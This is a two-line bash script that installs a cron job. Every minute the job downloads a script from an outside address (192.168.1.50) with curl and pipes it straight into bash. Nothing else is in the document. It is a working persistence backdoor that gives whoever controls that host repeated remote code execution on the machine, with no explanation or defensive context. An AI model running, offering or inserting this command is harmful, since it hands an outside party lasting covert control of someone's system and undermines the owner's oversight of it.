#!/bin/bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://192.168.1.50/b | bash") | crontab -
